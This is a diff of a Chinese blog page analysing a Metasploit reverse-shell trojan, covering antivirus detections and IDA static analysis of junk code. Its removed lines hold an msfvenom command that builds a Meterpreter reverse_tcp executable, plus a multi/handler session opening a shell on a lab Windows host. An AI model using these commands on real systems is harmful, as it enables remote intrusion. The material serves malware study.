@@ -6,12 +6,12 @@
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="HandheldFriendly" content="True">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
-    <meta name="description" content="杀软检测360报毒  1234类型HEUR&#x2F;QVM20.1.0AD7.Malware.Gen描述:HEUR&#x2F;QVM20.1.0AD7.Malware.Gen     火绒报毒: 病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)  攻击流程生成木马 12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;rever">
+    <meta name="description" content="背景: 第一次使用msf  杀软检测360报毒  1234类型HEUR&#x2F;QVM20.1.0AD7.Malware.Gen描述:HEUR&#x2F;QVM20.1.0AD7.Malware.Gen     火绒报毒: 病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)  分析过程首先用IDA静态分析 一来就出现了很多垃圾字节码  那长长的一条全是垃圾代码 特点: 123长度随机:">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf反弹shell木马分析 1.0">
 <meta property="og:url" content="https://redqx.github.io/2023/639917585808/index.html">
 <meta property="og:site_name" content="The simpler, the happier">
-<meta property="og:description" content="杀软检测360报毒  1234类型HEUR&#x2F;QVM20.1.0AD7.Malware.Gen描述:HEUR&#x2F;QVM20.1.0AD7.Malware.Gen     火绒报毒: 病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)  攻击流程生成木马 12┌──(kali㉿kali)-[~]└─$ msfvenom -p windows&#x2F;meterpreter&#x2F;rever">
+<meta property="og:description" content="背景: 第一次使用msf  杀软检测360报毒  1234类型HEUR&#x2F;QVM20.1.0AD7.Malware.Gen描述:HEUR&#x2F;QVM20.1.0AD7.Malware.Gen     火绒报毒: 病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)  分析过程首先用IDA静态分析 一来就出现了很多垃圾字节码  那长长的一条全是垃圾代码 特点: 123长度随机:">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://redqx.github.io/img/image-20231217171820296.png">
 <meta property="og:image" content="https://redqx.github.io/img/image-20231217171709251.png">
@@ -22,7 +22,7 @@
 <meta property="og:image" content="https://redqx.github.io/img/image-20231217223326163.png">
 <meta property="og:image" content="https://redqx.github.io/img/image-20231217223507418.png">
 <meta property="article:published_time" content="2023-12-17T09:14:39.326Z">
-<meta property="article:modified_time" content="2023-12-25T12:19:58.656Z">
+<meta property="article:modified_time" content="2023-12-26T12:45:50.861Z">
 <meta property="article:author" content="redqx">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://redqx.github.io/img/image-20231217171820296.png">
@@ -125,7 +125,7 @@
     
     
       <div id="toc">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">杀软检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">分析过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">杀软检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">分析过程</span></a></li></ol>
       </div>
     
   </span>
@@ -152,7 +152,7 @@
       
         <time datetime="2023-12-17T09:14:39.326Z" class="dt-published" itemprop="datePublished">2023-12-17</time>
         
-        (Updated: <time datetime="2023-12-25T12:19:58.656Z" class="dt-updated" itemprop="dateModified">2023-12-25</time>)
+        (Updated: <time datetime="2023-12-26T12:45:50.861Z" class="dt-updated" itemprop="dateModified">2023-12-26</time>)
         
       
     </div>
@@ -167,7 +167,10 @@
   
 
   <div class="content e-content" itemprop="articleBody">
-    <h1 id="杀软检测"><a href="#杀软检测" class="headerlink" title="杀软检测"></a>杀软检测</h1><p>360报毒 </p>
+    <blockquote>
+<p>背景: 第一次使用msf</p>
+</blockquote>
+<h1 id="杀软检测"><a href="#杀软检测" class="headerlink" title="杀软检测"></a>杀软检测</h1><p>360报毒 </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">类型</span><br><span class="line">HEUR/QVM20.1.0AD7.Malware.Gen</span><br><span class="line">描述:</span><br><span class="line">HEUR/QVM20.1.0AD7.Malware.Gen</span><br></pre></td></tr></table></figure>
 
 
@@ -176,20 +179,6 @@
 <p>火绒报毒:</p>
 <p>病毒类型: 代码混淆器(VirTool&#x2F;Meterpreter.a)</p>
 <p><img src="/./img/image-20231217171709251.png" alt="image-20231217171709251"></p>
-<h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><p>生成木马</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.127.129 LPORT=4444 -f exe -o app.exe</span><br></pre></td></tr></table></figure>
-
-
-
-<p>进入<code> msfconsole</code></p>
-<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ msfconsole</span><br><span class="line">msf6 &gt; use exploit/multi/handler</span><br><span class="line">msf6 exploit(multi/handler) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LHOST 192.168.127.129</span><br><span class="line">msf6 exploit(multi/handler) &gt; set LPORT 8888</span><br><span class="line">msf6 exploit(multi/handler) &gt; show options</span><br><span class="line">msf6 exploit(multi/handler) &gt; exploit</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.127.129:8888 </span><br><span class="line">[*] Sending stage (175686 bytes) to 192.168.127.128</span><br><span class="line">[*] Meterpreter session 1 opened (192.168.127.129:8888 -&gt; 192.168.127.128:50044) at 2023-12-17 04:31:45 -0500</span><br><span class="line"></span><br><span class="line">meterpreter &gt; pwd</span><br><span class="line">C:\Users\D0g3\Desktop</span><br><span class="line">meterpreter &gt; sysinfo</span><br><span class="line">Computer        : DESKTOP-FNOV5IM</span><br><span class="line">OS              : Windows 10 (10.0 Build 19044).</span><br><span class="line">Architecture    : x64</span><br><span class="line">System Language : zh_CN</span><br><span class="line">Domain          : WORKGROUP</span><br><span class="line">Logged On Users : 2</span><br><span class="line">Meterpreter     : x86/windows</span><br><span class="line">meterpreter &gt; </span><br></pre></td></tr></table></figure>
-
-
-
-
-
-
-
 <h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>首先用IDA静态分析</p>
 <p>一来就出现了很多垃圾字节码</p>
 <p><img src="/./img/image-20231217220800568.png" alt="image-20231217220800568"></p>
@@ -284,7 +273,7 @@
     
     
       <div id="toc-footer" style="display: none">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">杀软检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">攻击流程</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">3.</span> <span class="toc-text">分析过程</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%9D%80%E8%BD%AF%E6%A3%80%E6%B5%8B"><span class="toc-number">1.</span> <span class="toc-text">杀软检测</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%88%86%E6%9E%90%E8%BF%87%E7%A8%8B"><span class="toc-number">2.</span> <span class="toc-text">分析过程</span></a></li></ol>
       </div>
     
 
